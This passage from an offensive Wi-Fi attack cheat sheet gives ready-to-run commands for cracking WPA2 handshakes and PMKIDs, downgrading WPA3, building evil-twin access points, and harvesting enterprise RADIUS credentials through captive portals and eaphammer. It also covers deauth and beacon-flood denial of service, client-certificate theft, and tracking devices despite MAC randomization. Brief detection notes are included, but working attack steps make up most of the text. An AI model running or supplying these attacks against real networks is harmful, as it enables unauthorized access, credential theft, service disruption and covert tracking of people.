sudo mdk4 wlan0mon d -B <AP_MAC> -c <CLIENT_MAC>

# Step 3: Verify handshake captured
# Airodump shows "WPA handshake: <BSSID>" in top-right
# Verify with aircrack:
aircrack-ng wpa_capture-01.cap
# Or cowpatty:
cowpatty -r wpa_capture-01.cap -c

# Step 4: Crack with wordlist
# Aircrack-ng:
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# Hashcat (GPU-accelerated - MUCH faster):
# Convert capture to hashcat format:
# For .pcapng files (from hcxdumptool):
hcxpcapngtool -o hash.hc22000 wpa_capture.pcapng
# For .cap files (from airodump-ng), convert first:
# Option A: Use deprecated but functional cap2hccapx:
cap2hccapx wpa_capture-01.cap hash.hccapx
# Option B: Convert cap to pcapng then use hcxpcapngtool:
tshark -F pcapng -r wpa_capture-01.cap -w wpa_capture.pcapng
hcxpcapngtool -o hash.hc22000 wpa_capture.pcapng

# Crack with hashcat:
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# With rules:
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Brute force 8 digits:
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
# Common patterns (Name+digits):
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?l?d?d?d?d

# John the Ripper:
aircrack-ng -J hash wpa_capture-01.cap    # Create john format
john --wordlist=/usr/share/wordlists/rockyou.txt hash.hccap

# ============================================
# METHOD 2: PMKID ATTACK (No client needed!)
# ============================================

# Capture PMKID directly from AP (no deauth needed):
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --active_beacon --enable_status=15
# Wait 1-5 minutes, then Ctrl+C

# Filter for specific target:
echo "<AP_MAC>" > targets.txt
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng \
  --filterlist_ap=targets.txt --filtermode=2 \
  --active_beacon --enable_status=15

# Convert for hashcat:
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Check if PMKID was captured:
cat pmkid.hc22000 | head
# Lines starting with WPA*01* = PMKID
# Lines starting with WPA*02* = EAPOL handshake

# Crack:
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# ============================================
# METHOD 3: AUTOMATED WITH WIFITE
# ============================================
sudo wifite --wpa --kill               # Attack WPA networks
sudo wifite --dict /path/to/wordlist   # Specify wordlist
sudo wifite --num-deauths 10           # Increase deauths

# ============================================
# WORDLIST GENERATION
# ============================================
# Custom wordlist with crunch:
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt
# Pattern-based (company name + 4 digits):
crunch 12 12 -t CompanyN%%%% -o company_wordlist.txt
# @=lowercase, ,=uppercase, %=numbers, ^=symbols

# CUPP (Common User Passwords Profiler):
cupp -i                                # Interactive - generate based on target info

# Mentalist (GUI wordlist generator):
# Combine base words + rules for target-specific lists

# CeWL (scrape words from company website):
cewl https://www.target.com -d 3 -m 5 -w company_words.txt
# Combine with rules:
hashcat -m 22000 hash.hc22000 company_words.txt -r /usr/share/hashcat/rules/best64.rule
```

### 2.3 WPA3 Attacks

```bash
# WPA3-SAE is resistant to offline dictionary attacks
# BUT: implementation flaws and transition mode create opportunities
#
# ★ WHAT CHANGED SINCE DRAGONBLOOD (C3 — 2026 reality) ★
# Most modern WPA3-SAE implementations have added:
# - Hash-to-Curve (SAE-PT, RFC 9190 — published Sept 2022) — eliminates
#   the original Dragonblood timing/cache side-channel by removing the
#   "hunting and pecking" loop with a constant-time scalar multiplication
# - Anti-clogging tokens — mitigates Dragondrain DoS against AP CPU
# - Most APs shipped 2022+ implement Hash-to-Curve by default
# - Original Dragonblood (CVE-2019-9494/-9495/-9496) is LARGELY MITIGATED
#   on modern hardware
# - Newer SAE attack research:
#   * CVE-2022-23303 — wpa_supplicant SAE issue (different vector)
#   * EvilWP3 (Mathy Vanhoef Black Hat 2024) — see §2.3.3 below
# OPERATOR REALITY: Don't lead with Dragonblood against current hardware.
# Lead with transition-mode downgrade (§2.3.1), evil twin captive
# portal (§2.3.2), or EvilWP3 (§2.3.3) on supported targets.

# ============================================
# ATTACK 1: WPA3 TRANSITION MODE DOWNGRADE
# ============================================
# If AP runs WPA3 with transition mode (WPA2/WPA3 mixed):
# Force clients to connect via WPA2 instead

# Step 1: Identify transition mode APs
sudo airodump-ng wlan0mon
# Look for: WPA3 SAE with WPA2 listed (dual mode)

# Step 2: Create evil twin broadcasting only WPA2
cat << 'EOF' > hostapd_downgrade.conf
interface=wlan1
driver=nl80211
ssid=TargetNetworkName
hw_mode=g
channel=6
wpa=2
wpa_passphrase=doesntmatter
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
# Note: We don't need the real password for the evil twin

# Step 3: Deauth client from real AP
sudo aireplay-ng -0 0 -a <REAL_AP_MAC> wlan0mon

# Step 4: Client reconnects to evil twin via WPA2
# Capture the WPA2 handshake
# Crack offline with hashcat

# Alternative: Use hostapd-mana or bettercap for automated downgrade

# ============================================
# ATTACK 2: DRAGONBLOOD (SAE Side-Channel) — RESEARCH-GRADE 2026
# ============================================
# CVE-2019-9494, CVE-2019-9495, CVE-2019-9496 (Mathy Vanhoef 2019)
# Timing-based and cache-based side-channel attacks on SAE handshake
# Source: https://wpa3.mathyvanhoef.com
# CURRENT VIABILITY: LARGELY MITIGATED on hardware shipped 2022+ via
# Hash-to-Curve (SAE-PT, RFC 9190). PoCs remain useful for:
# - Embedded WPA3 implementations on cheap routers/IoT (often skip H2C)
# - Audit/research engagements demonstrating side-channel risk
# - Confirming legacy (pre-2022) hardware is unpatched

# Dragonslayer (tests SAE implementation for timing leaks):
git clone https://github.com/nicovank/dragonslayer.git

# Dragondrain (DoS against SAE without anti-clogging tokens):
# Floods AP with SAE commit messages, exhausting CPU
# Mostly mitigated on modern APs with anti-clogging — confirm absence
# before relying on this primitive

# ============================================
# ATTACK 3: EVILWP3 (Mathy Vanhoef Black Hat 2024) — NEW
# CVE cluster around WPA3 client SAE confirm-message handling
# ============================================
# Mathy Vanhoef + KU Leuven / NYU Abu Dhabi research disclosed at
# Black Hat USA 2024 — newer SAE attack chain that works against
# WPA3 clients with HASH-TO-CURVE ENABLED (i.e., post-Dragonblood
# hardened implementations).
# Source: https://wpa3.mathyvanhoef.com (research updates)
# Multiple CVE-2024-* identifiers issued for affected vendors;
# patch coverage is uneven Q1-Q2 2026.
#
# Mechanism (high-level):
# - Manipulate SAE confirm message exchange to extract partial PMK material
# - Combined with active probing, recovers passphrase-derived secrets
# - Affects: clients running older wpa_supplicant builds, embedded
#   devices, IoT
# Tooling: Vanhoef's research code (wpa3.mathyvanhoef.com publications);
# operational tooling is research-grade and not yet broadly available

# ============================================
# ATTACK 4: OWE TRANSITION MODE DOWNGRADE — NEW
# ============================================
# Opportunistic Wireless Encryption (OWE — RFC 8110) is the
# "encrypted open" mode used for guest networks. Many deployments
# run OWE TRANSITION MODE for client compatibility:
# - Two SSIDs broadcast: one OPEN, one OWE
# - OWE-capable clients use the encrypted SSID; legacy clients use open
# - Operator path: spoof the OPEN SSID (clients with both options
#   cached may downgrade to open) → MITM with bettercap/sslstrip
#
# DETECTION:
# Identify OWE Transition mode via beacon RSN element OWE-Transition IE:
sudo airodump-ng wlan0mon | grep -i "owe"
# Or directly via tshark:
sudo tshark -i wlan0mon -Y "wlan.rsn.akms.type == 18" \
  -T fields -e wlan.ssid

# EXPLOIT:
# Broadcast spoofed OPEN SSID matching transition-mode hidden SSID
# → vulnerable clients connect to open spoof
# Tool: standard hostapd open-network setup (cross-ref §2.6 evil twin)

# ============================================
# ATTACK 5: EVIL TWIN CAPTIVE PORTAL (Works against WPA3!)
# ============================================
# Even WPA3-only networks are vulnerable to social engineering
# Create open evil twin with captive portal requesting password

# Using Fluxion:
sudo ./fluxion.sh
# Select target → Create evil twin → Launch captive portal
# User enters Wi-Fi password thinking it's a portal

# Using Wifipumpkin3:
sudo wifipumpkin3
wp3> set interface wlan0
wp3> set ssid "TargetNetworkName"
wp3> set proxy captiveflask
wp3> start
```

### 2.4 WPA/WPA2-Enterprise Attacks

```bash
# Enterprise (802.1X) uses RADIUS authentication
# Common EAP types: PEAP, EAP-TTLS, EAP-TLS

# ============================================
# ATTACK 1: EVIL TWIN + CREDENTIAL CAPTURE
# ============================================

# EAPHammer (Purpose-built for Enterprise attacks):
# Create evil twin matching target SSID:
sudo python3 eaphammer --bssid <SPOOF_MAC> \
  --essid "CorpWiFi" \
  --channel 6 \
  --interface wlan0 \
  --auth wpa-eap \
  --creds

# With GTC downgrade (capture plaintext passwords):
sudo python3 eaphammer --bssid <SPOOF_MAC> \
  --essid "CorpWiFi" \
  --channel 6 \
  --interface wlan0 \
  --auth wpa-eap \
  --creds \
  --negotiate balanced

# hostapd-wpe (FreeRADIUS-WPE alternative):
# Edit /etc/hostapd-wpe/hostapd-wpe.conf:
# interface=wlan0
# ssid=CorpWiFi
# channel=6
# eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Captures: username, challenge, response (NTLM hash)
# Output file: /tmp/hostapd-wpe.log

# ============================================
# ATTACK 2: CRACK CAPTURED CREDENTIALS
# ============================================

# MSCHAPv2 challenge/response from hostapd-wpe logs:
# Format: username | challenge | response
# Convert to hashcat format:
# NETNTLM format for hashcat:
hashcat -m 5500 captured_hash.txt /usr/share/wordlists/rockyou.txt

# Using asleap (specific to LEAP/MSCHAPv2):
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt

# ============================================
# ATTACK 3: CERTIFICATE IMPERSONATION
# ============================================
# Many clients don't validate RADIUS server certificates
# Our evil twin's self-signed cert will be accepted

# Generate convincing fake cert:
openssl req -new -x509 -days 365 -nodes \
  -out server.pem -keyout server.key \
  -subj "/C=US/ST=State/L=City/O=Target Corp/CN=radius.target.com"

# Use with eaphammer:
sudo python3 eaphammer --cert-wizard    # Guided cert generation

# ============================================
# ATTACK 4: RADIUS RELAY / PASS-THROUGH
# ============================================
# Relay authentication to real RADIUS server
# Useful when you need actual network access, not just creds
# Tools: wpa_sycophant, berate_ap

# wpa_sycophant + berate_ap (relay attack):
git clone https://github.com/sensepost/berate_ap.git
git clone https://github.com/sensepost/wpa_sycophant.git
# Sets up evil twin that relays auth to real AP
# Client authenticates through you → you relay to real AP → you get on network

# ============================================
# ATTACK 5: EAP-TLS-ONLY ENVIRONMENT — NEW (G4)
# Modern enterprise increasingly enforces EAP-TLS only (no PEAP/TTLS)
# with NAC + cert validation. Standard EAPHammer cred capture FAILS.
# ============================================
# Why EAP-TLS-only blocks classic eaphammer cred capture:
# - Mutual cert auth — client validates RADIUS cert AND RADIUS validates
#   client cert. No password is ever transmitted.
# - Even if client trusts your evil-twin cert, you don't have the
#   client's private key → can't authenticate as them inward
# - PEAP/TTLS-style MSCHAPv2 challenge-response capture is N/A
#
# OPERATOR PATHS THAT WORK AGAINST EAP-TLS-ONLY:
#
# Path A: STEAL CLIENT CERTIFICATE FROM ENDPOINT
# - Compromise an endpoint with cert installed (phishing → workstation)
# - Extract cert from CertStore (Windows) or keychain (macOS):
#     # Windows (PowerShell, requires user context for User store):
#     Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.HasPrivateKey}
#     # Export with private key (typically requires non-exportable
#     # bypass — Mimikatz CRYPTO module or SharpDPAPI):
#     SharpDPAPI.exe certificates /machine
# - Convert to PFX and use with wpa_supplicant for legitimate auth
#
# Path B: BLE / SIDE-CHANNEL CERT INSTALL MITM (Hexway pattern)
# - Many enterprise cert provisioning workflows use OOB channel
#   (Microsoft Intune SCEP enrollment, Apple Configurator, JAMF)
# - Position to MITM the SCEP/EST endpoint OR compromise the
#   provisioning portal admin
# - Issue cert for attacker-controlled identity through legitimate CA
#
# Path C: NAC POSTURE BYPASS / DEVICE IMPERSONATION
# - Some NAC solutions use device cert + posture check; not user cert
# - If device cert exportable from one host, can be reused across hosts
# - Defender Stack catches this via posture/EDR mismatch (Aruba ClearPass
#   "device fingerprint mismatch" alert)
#
# Path D: SOCIAL ENGINEERING (most common in real engagements)
# - Help-desk vishing → enroll attacker's device with target identity
# - Internal phishing for SCEP enrollment URL + token
# - Cert bundle theft from user's email / Slack / Teams shared files
#
# DETECTION: NAC posture engine (ClearPass, ISE, Forescout) flags
#   anomalous device fingerprint or cert reuse from new endpoint;
#   Entra ID device compliance state mismatch.

# ============================================
# ATTACK 6: BLASTRADIUS (CVE-2024-3596) — NEW (G22)
# RADIUS protocol forgery — affects every WPA2/3-Enterprise
# deployment using PAP/CHAP/MS-CHAPv2 over RADIUS WITHOUT
# Message-Authenticator attribute enforcement
# Source: https://www.blastradius.fail
# Disclosed July 2024 — Goldberg/Hu research
# ============================================
# Mechanism (high-level):
# - Operator-in-the-middle between RADIUS client (NAS / authenticator)
#   and RADIUS server forges Access-Accept response
# - Exploits MD5 collision attack against RADIUS Response-Authenticator
# - Without RFC 5080 require-message-authenticator: forgery is feasible
# - With Message-Authenticator (HMAC-MD5 over packet): forgery blocked
#
# OPERATOR USE PATTERN:
# - Position MITM between AP and RADIUS server (often on same VLAN as
#   internal network — requires prior foothold OR rogue dot1q bridge)
# - Capture Access-Request from AP
# - Forge Access-Accept response → AP grants client (operator's identity)
#   network access without RADIUS server validation
# - Effective grant: any privilege RADIUS would have returned
#
# 2026 LANDSCAPE:
# - Most enterprise RADIUS implementations have patched (FreeRADIUS,
#   Microsoft NPS, Cisco ISE all shipped fixes Q3 2024)
# - Patches enforce Message-Authenticator on Access-Accept
# - Residual viability against unpatched / EOL RADIUS deployments
#   (smaller orgs, embedded NAS hardware not yet updated)
#
# DETECTION: RADIUS server logs Access-Accept events with
#   Message-Authenticator absent (most modern servers will reject
#   such packets post-patch); SIEM correlation on RADIUS auth from
#   non-baseline source IPs.
```

### 2.5 WPS Attacks

```bash
# ★ 2026 VIABILITY CAVEAT (C4 fix) ★
# Pixie Dust attack and online WPS PIN brute force have SIGNIFICANTLY
# DEGRADED viability against modern routers:
# - Most routers shipped 2019+ implement persistent WPS lockout after
#   3-10 failed PINs (lockout duration: hours to indefinite)
# - PRNG hardening on consumer routers since ~2018 — most modern
#   chipsets (Broadcom, Realtek post-2018, MediaTek post-2019) resist
#   Pixie Dust offline key recovery
# - PixieWPS success rate against modern routers: <15% per Bastille
#   Networks 2023-2024 testing
# - WPS often DISABLED BY DEFAULT on enterprise APs (Cisco, Aruba)
# - Where present, WPS Push Button (PBC) is the most common mode —
#   Pixie Dust does NOT apply (PBC has different state machine)
#
# OPERATOR DECISION 2026:
# - DEFAULT: skip WPS attacks; use PMKID/handshake (§2.2) as primary
# - WPS ONLY IF: target is consumer/SOHO router, age 2017 or older,
#   passphrase strong enough that PMKID won't crack in reasonable time
# - WPS LOCKOUT BYPASS: mdk4 auth flood (below) helps on some routers
#   but most modern devices ignore this and remain locked

# === WPS PIN BRUTE FORCE ===
# Scan for WPS-enabled APs (results often heavily reduced 2026):
sudo wash -i wlan0mon

# Reaver (WPS brute force — historical primary tool):
sudo reaver -i wlan0mon -b <AP_MAC> -c <channel> -vv
# With Pixie Dust (offline attack — historical "seconds vs hours";
# 2026 viability degraded — see caveat above):
sudo reaver -i wlan0mon -b <AP_MAC> -c <channel> -K 1 -vv
# Options:
# -K 1    = Pixie Dust attack
# -d 1    = Delay between PINs (seconds)
# -N      = Don't send NACK
# -S      = Use small DH keys (faster)
# -r 3:15 = Recurring delay (3 attempts, 15 sec wait)

# Bully (alternative WPS brute force):
sudo bully wlan0mon -b <AP_MAC> -c <channel> -v 3
# Pixie Dust with bully:
sudo bully wlan0mon -b <AP_MAC> -c <channel> -d -v 3

# If WPS is locked after too many attempts:
# Wait (typically 60-300 seconds) or:
sudo mdk4 wlan0mon a -a <AP_MAC>      # Auth flood to unlock some APs
```

### 2.6 Evil Twin / Rogue AP Attacks

```bash
# ============================================
# BETTERCAP EVIL TWIN
# ============================================
sudo bettercap -iface wlan0

# Inside bettercap (RF-side AP setup only):
set wifi.ap.ssid "FreeWiFi"
set wifi.ap.bssid AA:BB:CC:DD:EE:FF
set wifi.ap.channel 6
set wifi.ap.encryption false           # Open network
wifi.recon on
wifi.ap on

# Note: Once a victim associates, post-association MITM (sslstrip,
# HTTP/HTTPS proxy, credential sniffing) is layer-7 and lives in the
# web testing / lateral movement cheatsheets — not RF scope.

# ============================================
# HOSTAPD + DNSMASQ (Manual Setup)
# ============================================
# Step 1: hostapd config
cat << 'EOF' > /tmp/hostapd.conf
interface=wlan0
driver=nl80211
ssid=CorpGuest
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
wpa=0
EOF

# Step 2: dnsmasq config
cat << 'EOF' > /tmp/dnsmasq.conf
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
address=/#/10.0.0.1
EOF

# Step 3: Network setup
sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up
sudo iptables --flush
sudo iptables -t nat --flush
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Step 4: Start services
sudo hostapd /tmp/hostapd.conf &
sudo dnsmasq -C /tmp/dnsmasq.conf -d &

# Step 5: Deauth clients from real AP:
sudo aireplay-ng -0 0 -a <REAL_AP_MAC> wlan0mon

# ============================================
# WIFIPUMPKIN3 (Full Framework)
# ============================================
sudo wifipumpkin3
wp3> set interface wlan0
wp3> set ssid "CorpGuest"
wp3> set proxy noproxy
# Plugins:
wp3> use modules/spoof/dns_spoof
wp3> set domains target.com
wp3> set redirect 10.0.0.1
wp3> start

# ============================================
# KARMA / KNOWN BEACONS ATTACK
# ============================================
# Respond to ANY probe request with matching SSID
# Client thinks it found a known network

# Using WiFi Pineapple:
# PineAP → Enable: Allow Associations, Broadcast SSID Pool
# Add SSIDs: "attwifi", "xfinitywifi", "Starbucks WiFi", etc.

# Using bettercap:
sudo bettercap -iface wlan0
wifi.recon on
# Observe probes, then create matching AP:
set wifi.ap.ssid "<probed_ssid>"
wifi.ap on

# Using hostapd-mana (responds to all probes):
# Config with mana_ssids to respond to everything
```

### 2.7 Denial of Service Attacks

```bash
# === WARNING: DoS attacks cause disruption — use only with explicit authorization ===

# Deauthentication flood:
sudo aireplay-ng -0 0 -a <AP_MAC> wlan0mon           # All clients
sudo aireplay-ng -0 0 -a <AP_MAC> -c <CLIENT> wlan0mon  # Specific client

# MDK4 (Advanced wireless DoS):
# Authentication flood:
sudo mdk4 wlan0mon a -a <AP_MAC>
# Deauth flood:
sudo mdk4 wlan0mon d -B <AP_MAC>
# Beacon flood (fake APs):
sudo mdk4 wlan0mon b -n "FakeSSID" -c 6              # Single SSID
sudo mdk4 wlan0mon b -f ssid_list.txt                 # From file
sudo mdk4 wlan0mon b -a -w nta                        # Random SSIDs with encryption
# Michael (TKIP) shutdown:
sudo mdk4 wlan0mon m -t <AP_MAC>                      # Triggers TKIP countermeasures

# Note: WPA3 with PMF (Protected Management Frames) mitigates deauth attacks
# But: PMF only protects AFTER connection — connection attempts can still be blocked
```

### 2.8 — 6 GHz Band Attack Constraints

```
═══════════════════════════════════════════════════════════
6 GHz (Wi-Fi 6E) ATTACK SURFACE
═══════════════════════════════════════════════════════════

REGULATORY CONSTRAINTS (operator-relevant):
- WPA3 + PMF MANDATORY (no WPA2, no open, no OWE without PMF)
- No deauth attacks (PMF blocks management frame forgery)
- LPI / SP / VLP power tiers limit transmit reach
- RNR (Reduced Neighbor Report) IE in 2.4/5 GHz beacons advertises
  6 GHz BSSes — primary discovery vector

WHAT DOES NOT WORK ON 6 GHz:
- aireplay-ng -0 (deauth) → PMF blocks
- mdk4 d (deauth flood) → PMF blocks
- airodump-ng client kick to force handshake → PMF blocks
- Classical evil twin requiring deauth-driven client migration
- Most KRACK/FragAttacks variants requiring management frame
  manipulation

WHAT STILL WORKS ON 6 GHz:
- Evil twin captive portal (social engineering bypasses crypto)
- Transition-mode-equivalent attacks on dual-band APs (5 GHz
  WPA2 fallback when 6 GHz WPA3 is unavailable)
- WPA3 SAE attacks (Dragonblood / EvilWP3 — research-grade)
- Client-side exploits (CVE-2024-30078 Intel Wi-Fi RCE, etc.)
- Beacon flooding (broadcasts permitted; clients can be confused
  by proliferation of fake APs)

OPERATOR PRACTICAL APPROACH:
1. Recon both 5 GHz + 6 GHz on target SSID
2. If 5 GHz uses WPA2 (transition mode for older clients): treat
   as WPA2 attack and ignore 6 GHz
3. If 6 GHz only: pivot to social engineering / client-side / 
   research-grade SAE attacks
4. Many enterprise 6 GHz deployments are not yet WIDS/WIPS
   monitored at parity with 5 GHz — operator stealth advantage
```

### 2.9 — Wi-Fi 7 / 802.11be MLO Attacks

```bash
# ════════════════════════════════════════════════════════════
# WI-FI 7 MULTI-LINK OPERATION (MLO) ATTACKS
# Wi-Fi 7 ratified Q1 2024; deployment broadening through 2025-2026
# ════════════════════════════════════════════════════════════

# MLO DOWNGRADE ATTACK:
# Force client to drop 6 GHz link → fall back to 5 GHz where WPA2 +
# deauth attacks remain viable.
# Mechanism: ?disrupt 6 GHz link selectively (jamming on 6 GHz channel
# or flooding 6 GHz with malformed beacons that the client retries
# against) while preserving 5 GHz path for fallback. Requires hardware
# capable of 6 GHz transmit (Alfa AWUS036AXER or equivalent).

# CROSS-BAND SESSION HIJACKING:
# MLO derives PTK bound to all links. Compromise of one link affects
# session state across all bands. Specific PoCs not yet broadly public
# (research-grade Q1-Q2 2026).

# CVE-2024-30078 — Intel Wi-Fi DRIVER RCE (June 2024)
# Pre-auth RCE via crafted beacon; affects Intel AX/BE NICs:
# Source: https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-01038.html
# - Attack: malformed information element in beacon → driver memory
#   corruption → RCE in kernel context on target client
# - Target identification: Intel NIC fingerprint via vendor IE
# - PoCs: limited public release; Intel's coordinated disclosure
#   restricted operational tooling
# - Patched: Intel drivers June 2024; Windows / Linux distros pushed
#   updates Q3 2024
# - Operator path: target unpatched Intel-based clients (laptops, NUCs)

# 320 MHz CHANNEL CONFUSION:
# Wi-Fi 7 introduces 320 MHz channels (channels 31, 95, 159 in 6 GHz
# band). Some legacy WIDS/WIPS sensors monitor only 20/40/80 MHz —
# attacker AP on 320 MHz wide channel may evade detection in
# environments with mixed-generation defensive sensor fleet.

# DETECTION:
# - WIDS/WIPS that fully support Wi-Fi 7 (Cisco DNA Center 2.x+,
#   Aruba ClearPass 6.12+, Mist AI Q1 2025+) catch MLO anomalies
# - Identity-side detection (Entra Sign-in logs) sees client behavior
#   regardless of band — anomalous session patterns surface there
```

### 2.10 — OWE Attacks Deep-Dive

```bash
# ════════════════════════════════════════════════════════════
# OPPORTUNISTIC WIRELESS ENCRYPTION (OWE — RFC 8110)
# "Encrypted open" mode — used for guest networks, public Wi-Fi
# Increasingly common for hotel / airport / coffee shop WiFi
# ════════════════════════════════════════════════════════════

# MECHANISM:
# - Diffie-Hellman key exchange before data exchange
# - Each client gets unique session key (vs shared WPA2 PSK pool)
# - No password required; no client authentication
# - PMK derived per-session via DH

# ATTACK SURFACE:
#
# 1. SSID-PINNING ATTACK
# OWE specification allows clients to "pin" SSID + PMK after first
# connection. Operator pattern: spoof OWE SSID before client first-
# connects (e.g., new guest device joining hotel) → attacker's PMK
# becomes pinned for that SSID indefinitely.
# Mitigation: very few clients implement pin-checking warnings.
#
# 2. OWE TRANSITION MODE DOWNGRADE (cross-ref §2.3.4)
# Spoof open SSID matching transition-mode hidden SSID.
#
# 3. PMK COLLISION (research)
# DH parameters in OWE handshake have edge cases where attacker can
# manipulate group selection to force weak PMK derivation. Research-
# grade; not operationally common.
#
# 4. EVIL TWIN ON OWE NETWORK
# Operator stands up matching OWE SSID with attacker DH parameters →
# clients connect to attacker → standard MITM.
# Tooling: hostapd 2.10+ supports OWE; configure as evil twin:
cat << 'EOF' > /tmp/owe_twin.conf
interface=wlan0
driver=nl80211
ssid=GuestWiFi
hw_mode=g
channel=6
ieee80211w=2          # PMF required for OWE
wpa=2
wpa_key_mgmt=OWE
rsn_pairwise=CCMP
EOF
sudo hostapd /tmp/owe_twin.conf

# DETECTION: OWE Transition Mode anomaly detection in modern
#   WIDS/WIPS (Mist AI added Q4 2024); per-client PMK reuse across
#   sessions surfaces in cloud-side analytics.
```

### 2.11 — FT / 802.11r Fast Transition Attacks

```bash
# ════════════════════════════════════════════════════════════
# 802.11r FAST BSS TRANSITION (FT)
# Used for fast roaming between APs in enterprise WLANs
# Joshua Wright / others documented FT-PSK key extraction (~2017+)
# ════════════════════════════════════════════════════════════

# MECHANISM:
# - FT pre-computes PMK-R0 → PMK-R1 → PTK pairs at first association
# - PMK-R1 cached at each AP in mobility domain
# - Client roams between APs using cached PMK-R1 (no full 4-way handshake)

# ATTACK SURFACE:
#
# 1. FT-PSK KEY EXTRACTION (still works on many enterprise FT deployments)
# Capture FT 4-way handshake using hcxdumptool (PMK derivable from
# PSK + SSID + nonces). hashcat mode 22000 supports FT-PSK:
sudo hcxdumptool -i wlan0mon -o ft_capture.pcapng \
  --filterlist_ap=targets.txt --filtermode=2
# Look for "FT-PSK" in output; convert + crack same as WPA2:
hcxpcapngtool -o ft.hc22000 ft_capture.pcapng
hashcat -m 22000 ft.hc22000 wordlist.txt
#
# 2. FT-OVER-DS (Distribution System) ABUSE
# 802.11r Over-DS allows roam negotiation through wired backbone.
# Operator on wired-side foothold can manipulate FT messages →
# session hijack. Requires prior wired access.
#
# 3. PMK-R0 KEY HIERARCHY ATTACKS
# If attacker captures sufficient FT exchanges, statistical analysis
# of PMK-R1 derivations may reveal PMK-R0 (research-grade).

# DETECTION: WIDS/WIPS detecting unusual FT-Action frame patterns
#   between non-mobility-domain APs; FT key reuse across non-
#   peer APs.
```

### 2.12 — FragAttacks + KRACK + KrØØk Family

```bash
# ════════════════════════════════════════════════════════════
# FRAGATTACKS (CVE-2020-24586/-24587/-24588 + 9 implementation CVEs)
# Mathy Vanhoef 2021 — fundamental 802.11 design flaws + impl bugs
# Source: https://www.fragattacks.com
# ════════════════════════════════════════════════════════════

# AFFECTED: All Wi-Fi clients (design CVEs); many implementation CVEs
# AP-SIDE and CLIENT-SIDE.
# DESIGN FLAWS (3 — affect every Wi-Fi device):
# - CVE-2020-24588: Aggregation attack (frame injection)
# - CVE-2020-24587: Mixed-key fragment attack
# - CVE-2020-24586: Fragment cache attack (cross-frame data leak)
# IMPLEMENTATION FLAWS (9 — affect specific drivers):
# - Various — see fragattacks.com for full list

# OPERATOR USE:
# Tools: Vanhoef's research code at github.com/vanhoefm/fragattacks
# Most impactful operationally: aggregation attack — inject frames
# into target's Wi-Fi session WITHOUT key knowledge by manipulating
# A-MSDU framing.

# 2026 PATCH STATE:
# - Most major OS vendors patched 2021-2022 (Windows, macOS, Linux,
#   Android, iOS)
# - Embedded / IoT devices often UNPATCHED (no update mechanism)
# - Enterprise APs (Cisco, Aruba, Aerohive) patched 2021-2022
# - Operator viability: residual against legacy IoT, embedded clients

# === KRACK (CVE-2017-13077 family) — HISTORICAL ===
# Vanhoef 2017 — KRACK forces PMK reinstallation, allows decryption
# 2026 STATE: Mitigated on all modern OS via patches (verify version);
#   residual on truly legacy IoT (smart bulbs, embedded) without patch path
# Tools: github.com/vanhoefm/krackattacks-scripts (PoC-only)

# === KrØØk (CVE-2019-15126) — Cypress / Broadcom ===
# ESET 2019 — Bluetooth/Wi-Fi combo chip flaw causes key zeroing
# in disassociation → captured packets decryptable
# AFFECTED: Devices with Cypress / Broadcom FullMAC chips (iPhone 6-8,
#   iPad mini 2, MacBook 2014, Echo 2nd gen, Kindle, etc.)
# 2026 STATE: Patched in firmware updates; residual on EOL devices
```

### 2.13 — MAC Randomization Reality + Adapted Recon

```
═══════════════════════════════════════════════════════════
MAC RANDOMIZATION 2026 — WHAT WORKS / WHAT DOES NOT
═══════════════════════════════════════════════════════════

CURRENT STATE BY PLATFORM:
- iOS 14+ (Sept 2020): Per-network random MAC default; user can disable
- iPadOS 14+: Same as iOS
- macOS 14 Sonoma+ (Sept 2023): Per-network random MAC default for new
  networks; user can disable per-network
- Android 10 (2019): Per-SSID random MAC introduced
- Android 12+ (Oct 2021): Per-SSID random + non-persistent option
- Windows 10/11: Random MAC OPT-IN (per-network, default off)
- Linux NetworkManager: per-network or per-scan random (configurable;
  off by default in most distros)

WHAT NO LONGER WORKS:
- "Track this physical device by MAC across networks" — random MAC
  per network breaks this
- Probe-request MAC tracking for individual device identification —
  modern devices use one-time random MAC for probes
- Persistent MAC ACL bypass via spoofing — same broken; target's MAC
  changes per-network anyway

WHAT STILL WORKS:
- SSID list extraction from probes (probes still contain saved SSIDs
  even when MAC is random) — fingerprint by SSID profile
- IE-based fingerprinting (vendor IE + HT/VHT capabilities) —
  device-class identification persists across MAC randomization
- Connected-state MAC tracking within single network session
- Apple Continuity / Wireless metadata (separate channel, separate
  randomization regime — Hexway Reveal)
- Bluetooth + UWB cross-correlation (some devices keep persistent BT
  MAC even when Wi-Fi MAC randomizes)
- Sleep timing analysis (some devices have unique sleep patterns)
- Capability anomalies (Wi-Fi 7 + BLE 5.4 + UWB capable = iPhone 15+
  / Galaxy S24+ / Pixel 8+ inference)

OPERATOR ADAPTATION:
- Move from MAC-based tracking to SSID-list + IE-fingerprint
- Bettercap wifi.recon does this automatically (collects all probe IEs)
- For physical surveillance: cross-correlate Wi-Fi probes with BLE
  Continuity advertisements (different channels, different randomization
  schemes — together they often uniquely identify a target)
```

### 2.14 — ESP32 Marauder Attack Platform

